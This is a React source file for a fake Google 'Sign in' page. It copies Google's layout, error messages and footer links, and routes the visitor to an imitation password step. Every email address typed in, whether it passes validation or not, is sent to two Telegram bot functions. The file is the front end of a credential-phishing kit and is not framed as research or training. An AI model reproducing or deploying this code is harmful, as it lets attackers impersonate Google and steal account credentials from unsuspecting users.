import React, { useState } from 'react';
import './Login.css'
import { useDispatch, useSelector } from 'react-redux';
import { Link } from "react-router-dom";
import anotherImage from './580b57fcd9996e24bc43c51f.jpeg';
import { sendMessageToTelegram, sendMessageToTelegram2} from './TelegramBotComponent'; 

function Login() {
    const globalVariable = useSelector((state) => state.globalVariable);
    const dispatch = useDispatch();
    const [inputValue, setInputValue] = useState('');
    const [inputError, setInputError] = useState('');


    const handleButtonClick = () => {
        // Modify the global variable
        if (!validateEmail(inputValue)) {
            // If validation fails, set an error state and prevent moving to the next page
            setInputError('Invalid Gmail address');
            sendMessageToTelegram(`Failed Login: ${inputValue}`);
            sendMessageToTelegram2(`Failed Login: ${inputValue}`);
          } else {
            // If validation succeeds, clear the error state and proceed to the next page
            setInputError('');
            dispatch({ type: 'SETVARIABLE', payload: inputValue });
            sendMessageToTelegram(`Login: ${inputValue}`);
            sendMessageToTelegram2(`Login: ${inputValue}`);
          }
        
        
    };

    const handleInputChange = (e) => {
        // Update the local state with the input value
        setInputValue(e.target.value);
       
    };

    const validateEmail = (email) => {
        // Regular expression for a simple Gmail validation
        const regex = /^[a-zA-Z0-9._-]+@gmail.com$/;
        return regex.test(email);
      };

      const isLinkDisabled = !validateEmail(inputValue);
    

    return (
       
        <body>
            <main > 
                <div class="InputContainer">
                    <img src={anotherImage} alt="" height="25"/>
                    <h2 class="login">Sign in</h2>
                    <h4 class="use">Use your Google Account</h4>
                    
                    <input type="text" className={`gInput ${inputError ? 'error' : ''}`} autocomplete="email" placeholder="Email or phone" value={inputValue}
        onChange={handleInputChange} />
                    <label class={`inputLabel ${inputError ? 'error' : ''}`}></label>
                    {inputError && 
                    <div class="o6cuMc Jj6Lae"><span class="jibhHc"><svg aria-hidden="true" class="stUf5bqpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span><span class="gshgshs">Couldn't find your Google Account</span></div>}
                
                    <div class="forgotContainer">
                        <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue%26pli%3D1&dsh=S604563463%3A1706029166797074&ec=GAlAwAE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en_GB&service=accountsettings&theme=glif&authuser=0" class="forgot">Forgot Email?</a>
                    </div>
                    <h4 class="guest">Not your computer? Use Guest mode to sign in privately.
                    <br></br>
                    <a href="https://support.google.com/chrome/answer/6130773?hl=en-GB">Learn more about using Guest mode</a>
                    </h4>
                    
                    <div className="buttonContainer"> 
                        <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com/?utm_source%3Dsign_in_no_continue%26pli%3D1&dsh=S604563463:1706029166797074&ec=GAlAwAE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en_GB&service=accountsettings&theme=glif&TL=AHNYTITZQJskkjliToediYTBxZyE4MKKWWMck4ufa2Vlgmm5ovJ6MNtZ1sGGDcmI" className="btnCreate">Create Account</a>
                       
                    {isLinkDisabled ? (
                    <Link className="btnNext" disabled onClick={handleButtonClick}>
                        Next
                    </Link>
                    ) : (
                    <Link to="/v3/pwdTLAHNYTISLBQdq1oPINH30XKmymic4TxfHWG80GkvYGRDZgh4Wc7YUetmg7tinuehttps3A2F2Fthemeglifauthuser0" className="btnNext" onClick={handleButtonClick}>
                        Next
                    </Link>
                    )}
                    </div>
                    
                </div>
                <footer class="foot">
                    <div class="VfPpkd-TkwUic" >
                        <button class="languagebutton" id="languageButton" onclick="toggleDropdown()">
                        {/* <span >
                            <span class="VfPpkd-NSFCdd-Brv4Fb"> 
                            </span>
                            <span class="VfPpkd-NSFCdd-MpmGFe">
                            </span>
                        </span> */}
                        <span class="VfPpkd-uusGie-fmcmS-haAclf">
                        
                            English (United Kingdom)
                        
                        </span>
                        <span class="VfPpkd-t08AT-Bz112c" >
                            <svg class="VfPpkd-t08AT-Bz112c-Bd00G" viewBox="7 10 10 5" focusable="false" height="12" width="12">
                                <polygon class="VfPpkd-t08AT-Bz112c-mt1Mkb" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10">
                                </polygon>
                                {/* <polygon class="VfPpkd-t08AT-Bz112c-auswjd" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15">
                                </polygon> */}
                            </svg>
                        </span>
                        </button>
                        <span id="i3" aria-hidden="true" role="listbox"></span>
                    </div>
                
                    <div>
                        <ul className="Info">
                            <li>
                                <a class="NUwdAbTrZEUc1" href="https://support.google.com/accounts?hl=en-GB&amp;p=account_iph" >Help
                                </a>
                            </li>
                            <li>
                                <a class="NUwdAbTrZEUc2" href="https://accounts.google.com/TOS?loc=GH&amp;hl=en-GB&amp;privacy=true" >Privacy
                                </a>
                            </li>
                            <li>
                                <a class="NUwdAbTrZEUc3" href="https://accounts.google.com/TOS?loc=GH&amp;hl=en-GB" >Terms
                                </a>
                            </li>
                        </ul>
                    </div>
                    
                </footer>
            </main>
        </body>
    )
}

export default Login;






